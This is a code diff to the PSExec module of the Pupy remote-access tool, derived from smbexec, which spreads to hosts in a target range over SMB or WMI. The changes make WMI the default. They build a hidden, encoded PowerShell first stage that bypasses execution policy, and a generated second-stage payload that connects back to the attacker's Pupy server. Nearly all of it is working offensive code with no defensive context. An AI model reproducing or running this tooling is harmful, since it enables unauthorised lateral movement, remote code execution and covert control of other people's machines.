@@ -3,18 +3,18 @@
 # Version used from the "rewrite" branch of smbexec written by byt3bl33d3r
 from pupylib.PupyModule import *
 from pupylib.utils.rpyc_utils import redirected_stdo
+from rpyc.utils.classic import upload
+from subprocess import PIPE, Popen
+from base64 import b64encode
 import pupygen
-import re
-import os
 import tempfile
 import random
 import string
-from rpyc.utils.classic import upload
-from pupylib.payloads.ps1_oneliner import create_ps_command, getInvokeReflectivePEInjectionWithDLLEmbedded
 import shutil
-from subprocess import PIPE, Popen
-import time
 import ntpath
+import time
+import re
+import os
 
 __class_name__="PSExec"
 
@@ -40,7 +40,7 @@ class PSExec(PupyModule):
         self.arg_parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
         sgroup = self.arg_parser.add_argument_group("Command Execution", "Options for executing commands on the specified host")
-        sgroup.add_argument('-execm', choices={"smbexec", "wmi"}, dest="execm", default="smbexec", help="Method to execute the command (default: smbexec)")
+        sgroup.add_argument('-execm', choices={"smbexec", "wmi"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
         sgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute a command")
 
         sgroupp = self.arg_parser.add_argument_group("Command Execution", "Get a remote shell")
@@ -71,7 +71,7 @@ class PSExec(PupyModule):
                 remote_path = '%s\\' % self.client.conn.modules['os.path'].expandvars("%ALLUSERSPROFILE%")
             else:
                 remote_path = '/tmp/'
-
+            
             # write on the temp directory
             if args.share == 'C$':
                 dst_folder = "C:\\Windows\\TEMP\\"
@@ -97,18 +97,20 @@ class PSExec(PupyModule):
             # if uploading powershell
             else:
                 ext = '.txt'
-                first_stage = ''.join(random.sample(string.ascii_letters, 10)) + ext
-                second_stage = ''.join(random.sample(string.ascii_letters, 10)) + ext
-                file_to_upload = [first_stage, second_stage]
+                first_stage     = ''.join(random.sample(string.ascii_letters, 10)) + ext
+                second_stage    = ''.join(random.sample(string.ascii_letters, 10)) + ext
+                file_to_upload  = [first_stage, second_stage]
 
                 launcher = """cat {invoke_reflective_random_name} | Out-String | IEX""".format(invoke_reflective_random_name=dst_folder + second_stage)
-                launcher = create_ps_command(launcher, force_ps32=True, nothidden=False)
-                open(tmp_dir + os.sep + first_stage, 'w').write(launcher)
-                self.success('first stage created: %s' % tmp_dir + os.sep + first_stage)
+                launcher = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(launcher.encode('UTF-16LE')))
+                open(os.path.join(tmp_dir, first_stage), 'w').write(launcher)
+                self.success('first stage created: %s' % os.path.join(tmp_dir, first_stage))
 
-                command = getInvokeReflectivePEInjectionWithDLLEmbedded(self.client.get_conf())
-                open(tmp_dir + os.sep + second_stage, 'w').write(command)
-                self.success('second stage created: %s' % tmp_dir + os.sep + second_stage)
+                tmpfile = tempfile.gettempdir()
+                output  = pupygen.generate_ps1(conf={'launcher':'connect', 'launcher_args': ['--host', self.client.conn.modules['pupy'].get_connect_back_host()]}, output_dir=tmpfile, both=True)
+                os.rename(output, os.path.join(tmp_dir, second_stage))
+
+                self.success('second stage created: %s' % os.path.join(tmp_dir, second_stage))
 
             for file in file_to_upload:
                 src = tmp_dir + os.sep + file
